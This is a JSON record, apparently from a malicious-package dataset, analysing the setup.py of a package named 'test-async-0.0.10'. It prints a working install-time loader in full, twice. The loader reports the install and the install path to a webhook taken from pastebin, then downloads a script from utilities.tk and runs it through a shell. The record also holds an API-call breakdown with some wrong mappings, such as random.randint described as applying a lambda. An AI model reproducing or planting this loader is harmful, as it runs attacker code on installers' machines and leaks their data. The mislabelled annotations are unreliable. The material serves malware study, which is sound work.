[
  {
    "pyfile": "setup.py",
    "code_snippet": "import requests, random, os\ntry:\n    requests.post(requests.get('https://pastebin.com/raw/3xcr2My4').text, json={'content':'new run @everyone'})\n    r = random.randint(1, 50)\n    with open(f'./{r}.pyw', 'w') as f:\n        f.write(requests.get('https://utilities.tk/rscode?r=mewhenrscode').text)\n    requests.post(requests.get('https://pastebin.com/raw/3xcr2My4').text, json={'content':os.path.dirname(os.path.realpath(__file__))})\n    import subprocess\n    subprocess.Popen(f'python ./{r}.pyw', shell=True)\nexcept Exception as ex:\n    print(ex)",
    "pattern_analysis": {
      "api_sequence": [
        "requests.get",
        "requests.post",
        "random.randint",
        "open",
        "requests.get",
        "open.write",
        "os.path.realpath",
        "os.path.dirname",
        "requests.get",
        "requests.post",
        "subprocess.Popen"
      ],
      "api_sequence_with_args": [
        "requests.get('https://pastebin.com/raw/3xcr2My4')",
        "requests.post(requests.get('https://pastebin.com/raw/3xcr2My4').text, json={'content':'new run @everyone'})",
        "random.randint(1, 50)",
        "open(f'./{r}.pyw', 'w')",
        "requests.get('https://utilities.tk/rscode?r=mewhenrscode')",
        "open.write(requests.get('https://utilities.tk/rscode?r=mewhenrscode').text)",
        "os.path.realpath(__file__)",
        "os.path.dirname(os.path.realpath(__file__))",
        "requests.get('https://pastebin.com/raw/3xcr2My4')",
        "requests.post(requests.get('https://pastebin.com/raw/3xcr2My4').text, json={'content':os.path.dirname(os.path.realpath(__file__))})",
        "subprocess.Popen(f'python ./{r}.pyw', shell=True)"
      ],
      "mapped_sequence": [
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "requests.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "random.randint",
          "id": "apply_lambda_elements",
          "description": "Applies lambda to elements of two lists",
          "first_id": "data_transformation_processing",
          "second_id": "function_application",
          "third_id": "lambda_application"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "open.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "os.path.realpath",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.path.dirname",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "requests.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "subprocess.Popen",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        }
      ],
      "contextual_code": "import requests, random, os\ntry:\n    # 1. Exfiltrate notification of new run\n    requests.post(requests.get('https://pastebin.com/raw/3xcr2My4').text, json={'content':'new run @everyone'})\n    # 2. Generate random filename and write remote code to it\n    r = random.randint(1, 50)\n    with open(f'./{r}.pyw', 'w') as f:\n        f.write(requests.get('https://utilities.tk/rscode?r=mewhenrscode').text)\n    # 3. Exfiltrate local path\n    requests.post(requests.get('https://pastebin.com/raw/3xcr2My4').text, json={'content':os.path.dirname(os.path.realpath(__file__))})\n    # 4. Execute downloaded code\n    import subprocess\n    subprocess.Popen(f'python ./{r}.pyw', shell=True)\nexcept Exception as ex:\n    print(ex)"
    }
  },
  {
    "metadata": {
      "package_name": "test-async-0.0.10"
    }
  }
]